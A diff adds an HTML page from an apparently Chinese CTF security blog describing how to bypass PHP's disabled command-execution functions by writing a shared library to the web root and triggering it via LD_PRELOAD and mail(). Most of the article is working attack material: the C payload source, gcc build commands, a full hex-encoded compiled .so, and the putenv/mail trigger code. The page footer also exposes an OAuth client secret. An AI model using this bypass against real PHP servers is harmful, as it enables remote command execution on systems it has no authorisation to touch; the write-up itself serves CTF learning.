@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>文件任意写入getshell | Err0r</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="通过文件任意写入来getshell">
+<meta name="keywords" content="PHP execise">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件任意写入getshell">
+<meta property="og:url" content="http://Err0rzz.github.io/2017/09/18/文件任意写入getshell/index.html">
+<meta property="og:site_name" content="Err0r">
+<meta property="og:description" content="通过文件任意写入来getshell">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://i.imgur.com/4eAP2nk.png">
+<meta property="og:updated_time" content="2017-12-21T12:21:14.301Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="文件任意写入getshell">
+<meta name="twitter:description" content="通过文件任意写入来getshell">
+<meta name="twitter:image" content="https://i.imgur.com/4eAP2nk.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Err0r" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.jpg">
+  
+  
+      <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: false,
+          isPost: true,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="/img/head.jpg" class="js-avatar">
+            
+        </a>
+
+        <hgroup>
+          <h1 class="header-author"><a href="/" title="Hi Mate">Err0r</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">壮壮&#39; home</p>
+        
+        
+            <form>
+                <input type="text" class="st-default-search-input search" id="search" placeholder=" Search...">
+            </form>
+        
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">博客首页</a></li>
+                        
+                            <li><a href="/archives/">个人档案</a></li>
+                        
+                            <li><a href="/links/">友情链接</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl github" target="_blank" href="https://github.com/Err0rzz" title="github">github</a>
+                            
+                                <a class="fl weibo" target="_blank" href="http://weibo.com/5693631701/profile?topnav=1&wvr=6" title="weibo">weibo</a>
+                            
+                                <a class="fl linkedin" target="_blank" href="https://betamao.me/" title="linkedin">linkedin</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                
+                
+
+                
+                
+                <section class="switch-part switch-part3">
+                
+                    <div id="js-aboutme">爱游戏爱妹子</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">Err0r</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">Err0r</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">壮壮&#39; home</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">博客首页</a></li>
+                
+                    <li><a href="/archives/">个人档案</a></li>
+                
+                    <li><a href="/links/">友情链接</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="github" target="_blank" href="https://github.com/Err0rzz" title="github">github</a>
+                    
+                        <a class="weibo" target="_blank" href="http://weibo.com/5693631701/profile?topnav=1&wvr=6" title="weibo">weibo</a>
+                    
+                        <a class="linkedin" target="_blank" href="https://betamao.me/" title="linkedin">linkedin</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="titile-文件任意写入getshell" class="article article-type-titile" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/09/18/文件任意写入getshell/" class="article-date">
+      <time datetime="2017-09-18T08:10:32.000Z" itemprop="datePublished">2017-09-18</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      文件任意写入getshell
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP-execise/">PHP execise</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>通过文件任意写入来getshell<br><a id="more"></a><br>函数里屏蔽了所有的命令执行函数以及文件读取函数，但是允许文件的任意写入，这里仅提供一种思路：将事先编译好的共享库文件写到web根目录下，然后通过putenv函数设置环境变量中的LD_PRELOAD为该so文件,并使用mail函数调用/usr/bin/sendmail，最终执行共享库文件中的恶意代码。<br>编写hack.c文件如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></div><div class="line"><span class="comment">#include &lt;stdio.h&gt;</span></div><div class="line"><span class="comment">#include &lt;string.h&gt;</span></div><div class="line">void <span class="function"><span class="title">payload</span></span>() &#123;</div><div class="line">system(<span class="string">"ls &gt;p01.txt"</span>);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="title">intgeteuid</span></span>() &#123;</div><div class="line"><span class="keyword">if</span> (getenv(<span class="string">"LD_PRELOAD"</span>) == NULL) &#123; <span class="built_in">return</span> 0; &#125;</div><div class="line">unsetenv(<span class="string">"LD_PRELOAD"</span>);</div><div class="line">payload();</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>编译该共享库文件，生成hack.so文件：<br>    <code>gcc -c -fPIChack.c -o hack</code><br>    <code>gcc -shared hack -o hack.so</code></p>
+<p>使用如下php代码将so文件读取成十六进制串：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"><span class="variable">$content</span>=file_get_contents(<span class="string">"hack.so"</span>);</div><div class="line"><span class="built_in">echo</span> bin2hex(<span class="variable">$content</span>);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>最终将十六进制字串写入web根目录下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">$content = &quot;7f454c4602010100000000000000000003003e0001000000c006000000000000400000000000000070110000000000000000000040003800070040001c0019000100000005000000000000000000000000000000000000000000000000000000bc08000000000000bc0800000000000000002000000000000100000006000000f80d000000000000f80d200000000000f80d2000000000005002000000000000580200000000000000002000000000000200000006000000180e000000000000180e200000000000180e200000000000c001000000000000c00100000000000008000000000000000400000004000000c801000000000000c801000000000000c80100000000000024000000000000002400000000000000040000000000000050e574640400000010080000000000001008000000000000100800000000000024000000000000002400000000000000040000000000000051e574640600000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000052e5746404000000f80d000000000000f80d200000000000f80d200000000000080200000000000008020000000000000100000000000000040000001400000003000000474e55008d40027068f204a76998e616d17fd281ea5656c800000000030000000a000000010000000600000088c82001801440090a0000000c0000000e0000004245d5ecbbe3927cd871581cb98df10eead3ef0eec9273f0cf49499c0000000000000000000000000000000000000000000000000000000003000900280600000000000000000000000000008c00000012000000000000000000000000000000000000001c00000020000000000000000000000000000000000000007d0000001200000000000000000000000000000000000000010000002000000000000000000000000000000000000000610000002000000000000000000000000000000000000000930000001200000000000000000000000000000000000000380000002000000000000000000000000000000000000000520000002200000000000000000000000000000000000000a60000001000160048102000000000000000000000000000b90000001000170050102000000000000000000000000000ad00000010001700481020000000000000000000000000001000000012000900280600000000000000000000000000001600000012000c00f00700000000000000000000000000008400000012000b00ba0700000000000034000000000000007500000012000b00a8070000000000001200000000000000005f5f676d6f6e5f73746172745f5f005f696e6974005f66696e69005f49544d5f64657265676973746572544d436c6f6e655461626c65005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573007061796c6f61640073797374656d006765746575696400676574656e7600756e736574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000002000000020000000000020000000200010001000100010001000100010000000000010001009c0000001000000000000000751a690900000200be00000000000000f80d20000000000008000000000000007007000000000000000e20000000000008000000000000003007000000000000100e2000000000000800000000000000100e200000000000d80f20000000000006000000030000000000000000000000e00f20000000000006000000050000000000000000000000e80f20000000000006000000060000000000000000000000f00f20000000000006000000080000000000000000000000f80f200000000000060000000900000000000000000000001810200000000000070000000200000000000000000000002010200000000000070000000400000000000000000000002810200000000000070000000500000000000000000000003010200000000000070000001000000000000000000000003810200000000000070000000700000000000000000000004010200000000000070000000900000000000000000000004883ec08488b05ad0920004885c07405e8430000004883c408c30000000000000000000000000000ff35b2092000ff25b40920000f1f4000ff25b20920006800000000e9e0ffffffff25aa0920006801000000e9d0ffffffff25a20920006802000000e9c0ffffffff259a0920006803000000e9b0ffffffff25920920006804000000e9a0ffffffff258a0920006805000000e990ffffff488d0588092000488d3d7a092000554829f84889e54883f80e77025dc3488b05f40820004885c074f25dffe00f1f4000488d0551092000488d3d4a092000554829f84889e548c1f8034889c248c1ea3f4801d048d1f875025dc3488b15cf0820004885d274f25d4889c6ffe20f1f4000803d1109200000752748833db708200000554889e5740c488d3dc2062000e85dffffffe868ffffff5dc605e808200001f3c366666666662e0f1f84000000000048833d90062000007426488b05670820004885c0741a55488d3d7a0620004889e5ffd05de957ffffff0f1f8000000000e94bffffff0f1f00554889e5488d3d46000000e8b8feffff5dc3554889e5488d3d40000000e896feffff4885c07507b800000000eb16488d3d28000000e8befeffffb800000000e8a4feffff5dc366904883ec084883c408c36c73203e7030312e747874004c445f5052454c4f414400011b033b240000000300000040feffff4000000098ffffff68000000aaffffff88000000000000001400000000000000017a5200017810011b0c070890010000240000001c000000f8fdffff70000000000e10460e184a0f0b770880003f1a3b2a332422000000001c0000004400000028ffffff1200000000410e108602430d064d0c07080000001c000000640000001affffff3400000000410e108602430d066f0c0708000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000700700000000000030070000000000000000000000000000100e20000000000001000000000000009c000000000000000c0000000000000028060000000000000d00000000000000f0070000000000001900000000000000f80d2000000000001b0000000000000008000000000000001a00000000000000000e2000000000001c000000000000000800000000000000f5feff6f00000000f0010000000000000500000000000000c803000000000000060000000000000030020000000000000a00000000000000ca000000000000000b000000000000001800000000000000030000000000000000102000000000000200000000000000900000000000000014000000000000000700000000000000170000000000000098050000000000000700000000000000d8040000000000000800000000000000c00000000000000009000000000000001800000000000000feffff6f00000000b804000000000000ffffff6f000000000100000000000000f0ffff6f000000009204000000000000f9ffff6f000000000300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000180e200000000000000000000000000000000000000000006606000000000000760600000000000086060000000000009606000000000000a606000000000000b6060000000000004743433a2028474e552920342e382e3520323031353036323320285265642048617420342e382e352d31312900002e73796d746162002e737472746162002e7368737472746162002e6e6f74652e676e752e6275696c642d6964002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e696e69745f6172726179002e66696e695f6172726179002e6a6372002e646174612e72656c2e726f002e64796e616d6963002e676f74002e676f742e706c74002e627373002e636f6d6d656e74000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001b000000070000000200000000000000c801000000000000c80100000000000024000000000000000000000000000000040000000000000000000000000000002e000000f6ffff6f0200000000000000f001000000000000f0010000000000004000000000000000030000000000000008000000000000000000000000000000380000000b000000020000000000000030020000000000003002000000000000980100000000000004000000020000000800000000000000180000000000000040000000030000000200000000000000c803000000000000c803000000000000ca0000000000000000000000000000000100000000000000000000000000000048000000ffffff6f020000000000000092040000000000009204000000000000220000000000000003000000000000000200000000000000020000000000000055000000feffff6f0200000000000000b804000000000000b804000000000000200000000000000004000000010000000800000000000000000000000000000064000000040000000200000000000000d804000000000000d804000000000000c0000000000000000300000000000000080000000000000018000000000000006e000000040000000200000000000000980500000000000098050000000000009000000000000000030000000a0000000800000000000000180000000000000078000000010000000600000000000000280600000000000028060000000000001a00000000000000000000000000000004000000000000000000000000000000730000000100000006000000000000005006000000000000500600000000000070000000000000000000000000000000100000000000000010000000000000007e000000010000000600000000000000c006000000000000c006000000000000300100000000000000000000000000001000000000000000000000000000000084000000010000000600000000000000f007000000000000f00700000000000009000000000000000000000000000000040000000000000000000000000000008a000000010000000200000000000000f907000000000000f907000000000000170000000000000000000000000000000100000000000000000000000000000092000000010000000200000000000000100800000000000010080000000000002400000000000000000000000000000004000000000000000000000000000000a0000000010000000200000000000000380800000000000038080000000000008400000000000000000000000000000008000000000000000000000000000000aa0000000e0000000300000000000000f80d200000000000f80d0000000000000800000000000000000000000000000008000000000000000000000000000000b60000000f0000000300000000000000000e200000000000000e0000000000000800000000000000000000000000000008000000000000000000000000000000c2000000010000000300000000000000080e200000000000080e0000000000000800000000000000000000000000000008000000000000000000000000000000c7000000010000000300000000000000100e200000000000100e0000000000000800000000000000000000000000000008000000000000000000000000000000d4000000060000000300000000000000180e200000000000180e000000000000c001000000000000040000000000000008000000000000001000000000000000dd000000010000000300000000000000d80f200000000000d80f0000000000002800000000000000000000000000000008000000000000000800000000000000e2000000010000000300000000000000001020000000000000100000000000004800000000000000000000000000000008000000000000000800000000000000eb000000080000000300000000000000481020000000000048100000000000000800000000000000000000000000000004000000000000000000000000000000f0000000010000003000000000000000000000000000000048100000000000002d000000000000000000000000000000010000000000000001000000000000001100000003000000000000000000000000000000000000007510000000000000f900000000000000000000000000000001000000000000000000000000000000010000000200000000000000000000000000000000000000701800000000000070050000000000001b0000002b00000008000000000000001800000000000000090000000300000000000000000000000000000000000000e01d000000000000f8010000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000003000100c80100000000000000000000000000000000000003000200f00100000000000000000000000000000000000003000300300200000000000000000000000000000000000003000400c80300000000000000000000000000000000000003000500920400000000000000000000000000000000000003000600b80400000000000000000000000000000000000003000700d80400000000000000000000000000000000000003000800980500000000000000000000000000000000000003000900280600000000000000000000000000000000000003000a00500600000000000000000000000000000000000003000b00c00600000000000000000000000000000000000003000c00f00700000000000000000000000000000000000003000d00f90700000000000000000000000000000000000003000e00100800000000000000000000000000000000000003000f00380800000000000000000000000000000000000003001000f80d20000000000000000000000000000000000003001100000e20000000000000000000000000000000000003001200080e20000000000000000000000000000000000003001300100e20000000000000000000000000000000000003001400180e20000000000000000000000000000000000003001500d80f2000000000000000000000000000000000000300160000102000000000000000000000000000000000000300170048102000000000000000000000000000000000000300180000000000000000000000000000000000010000000400f1ff000000000000000000000000000000000c00000001001200080e20000000000000000000000000001900000002000b00c00600000000000000000000000000002e00000002000b00f00600000000000000000000000000004100000002000b00300700000000000000000000000000005700000001001700481020000000000001000000000000006600000001001100000e20000000000000000000000000008d00000002000b00700700000000000000000000000000009900000001001000f80d2000000000000000000000000000b80000000400f1ff00000000000000000000000000000000010000000400f1ff00000000000000000000000000000000bf00000001000f00b8080000000000000000000000000000cd00000001001200080e2000000000000000000000000000000000000400f1ff00000000000000000000000000000000d900000001001300100e2000000000000000000000000000e600000001001400180e2000000000000000000000000000ef0000000100160048102000000000000000000000000000fb00000001001600001020000000000000000000000000001101000012000000000000000000000000000000000000002501000020000000000000000000000000000000000000004101000010001600481020000000000000000000000000004801000012000c00f00700000000000000000000000000004e01000012000000000000000000000000000000000000006201000020000000000000000000000000000000000000007101000012000b00ba0700000000000034000000000000007901000012000b00a8070000000000001200000000000000810100001000170050102000000000000000000000000000860100001000170048102000000000000000000000000000920100002000000000000000000000000000000000000000a60100001200000000000000000000000000000000000000bc0100002000000000000000000000000000000000000000d60100002200000000000000000000000000000000000000f201000012000900280600000000000000000000000000000063727473747566662e63005f5f4a43525f4c4953545f5f00646572656769737465725f746d5f636c6f6e65730072656769737465725f746d5f636c6f6e6573005f5f646f5f676c6f62616c5f64746f72735f61757800636f6d706c657465642e36333434005f5f646f5f676c6f62616c5f64746f72735f6175785f66696e695f61727261795f656e747279006672616d655f64756d6d79005f5f6672616d655f64756d6d795f696e69745f61727261795f656e747279006861636b2e63005f5f4652414d455f454e445f5f005f5f4a43525f454e445f5f005f5f64736f5f68616e646c65005f44594e414d4943005f5f544d435f454e445f5f005f474c4f42414c5f4f46465345545f5441424c455f00676574656e764040474c4942435f322e322e35005f49544d5f64657265676973746572544d436c6f6e655461626c65005f6564617461005f66696e690073797374656d4040474c4942435f322e322e35005f5f676d6f6e5f73746172745f5f0067657465756964007061796c6f6164005f656e64005f5f6273735f7374617274005f4a765f5265676973746572436c617373657300756e736574656e764040474c4942435f322e322e35005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a654040474c4942435f322e322e35005f696e697400&quot;;file_put_contents(&quot;hack.so&quot;,hex2bin($content));</div><div class="line">putenv(&quot;LD_PRELOAD=/var/www/html/hack.so&quot;);chmod(&quot;hack.so&quot;,0777);mail(&quot;a@localhost&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);</div></pre></td></tr></table></figure></p>
+<p>在页面里提交即可遍历目录<br><img src="https://i.imgur.com/4eAP2nk.png" alt=""><br>再重复这个过程显示flag.php内容即可得到flag。</p>
+
+      
+      
+        <div class="page-reward">
+          <p><a href="javascript:void(0)" onclick="dashangToggle()" class="dashang">赏</a></p>
+          <div class="hide_box"></div>
+          <div class="shang_box">
+            <a class="shang_close" href="javascript:void(0)" onclick="dashangToggle()">×</a>
+            <div class="shang_tit">
+              <p>纯属好玩</p>
+            </div>
+            <div class="shang_payimg">
+              <img src="/img/alipayimg.jpg" alt="扫码支持" title="扫一扫" />
+            </div>
+              <div class="pay_explain">扫码打赏，你说多少就多少</div>
+            <div class="shang_payselect">
+              
+                <div class="pay_item checked" data-id="alipay">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/alipay.png" alt="支付宝" /></span>
+                </div>
+              
+              
+                <div class="pay_item" data-id="wechat">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/weixin.png" alt="微信" /></span>
+                </div>
+              
+            </div>
+            <div class="shang_info">
+              <p>打开<span id="shang_pay_txt">支付宝</span>扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+        </div>
+        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.min.js"></script>
+        <script type="text/javascript">
+          $(".pay_item").click(function(){
+            $(this).addClass('checked').siblings('.pay_item').removeClass('checked');
+            var dataid=$(this).attr('data-id');
+            $(".shang_payimg img").attr("src","/img/"+dataid+"img.jpg");
+            $("#shang_pay_txt").text(dataid=="alipay"?"支付宝":"微信");
+          });
+          function dashangToggle(){
+            
+            $(".hide_box").fadeToggle();
+            $(".shang_box").fadeToggle();
+          }
+        </script>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2017/09/18/文件任意写入getshell/">文件任意写入getshell</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 Err0r 的个人博客">Err0r</a></p>
+        <p><span>发布时间:</span>2017年09月18日 - 16时10分</p>
+        <p><span>最后更新:</span>2017年12月21日 - 20时21分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2017/09/18/文件任意写入getshell/" title="文件任意写入getshell">http://Err0rzz.github.io/2017/09/18/文件任意写入getshell/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://Err0rzz.github.io/2017/09/18/文件任意写入getshell/　　作者: Err0r" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+    <a href="/2017/09/18/hash长度扩展攻击/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption"><</strong>
+      <div class="article-nav-title">
+        
+          hash长度扩展攻击
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2017/09/16/问鼎杯线上/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">问鼎杯writeup</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    
+</div>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+    }
+</script>
+
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+        <div id="gitments"></div>
+<script src="/js/gitment.browser.js"></script>
+<script>
+    var gitment = new Gitment({
+      id: window.location.pathname,
+      owner: 'Err0rzz',
+      repo: 'Err0rzz.github.io',
+      oauth: {
+        client_id: 'd9c845fbbbb51d243003',
+        client_secret: 'b8310696d39906b802cc7f1f594f21501cb4e9d6',
+      },
+    })
+    gitment.render('gitments')
+</script>
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2017/09/18/hash长度扩展攻击/" title="上一篇: hash长度扩展攻击">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a href="/2017/09/16/问鼎杯线上/" title="下一篇: 问鼎杯writeup">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/12/21/iptables的简单使用/">iptables的简单使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/20/docker基本操作/">docker基本操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/15/CSRF学习/">CSRF学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/11/第一届智商杯wp/">第一届智商杯wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/26/linux下的mysql使用/">linux下的mysql使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/23/Padding-Oracle-攻击/">Padding_Oracle 攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/23/爆破脚本/">爆破脚本</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/16/OOB注入/">OOB注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/16/sage安装/">sage安装</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/14/CTF中RSA套路/">CTF中RSA套路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/14/GET的命令执行漏洞/">GET的命令执行漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/13/ctf命令执行与绕过/">ctf命令执行与绕过</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/09/无线破解浅谈/">无线破解浅谈</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/11/07/浅谈php安全/">浅谈php安全</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/31/updatexml-mysql显错注入/">mysql显错注入</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/26/typecho-backdoor/">typecho backdoor</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/24/问鼎杯决赛/">问鼎杯决赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/18/常用正则表达式/">常用正则表达式</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/18/hash长度扩展攻击/">hash长度扩展攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/18/文件任意写入getshell/">文件任意写入getshell</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/16/问鼎杯线上/">问鼎杯writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/11/jarvisoj/">javrisoj的web题</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/04/injection/">各种注入姿势</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/31/file_include/">文件包含一些常识</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/31/XMAN/">xman个人排位赛(纪念第一个xss)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/31/ZJGSCTF/">ZJGSCTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/08/25/blind-SQL-injection-script/">blind_SQL_injection script</a></li></ul>
+    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+    <script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
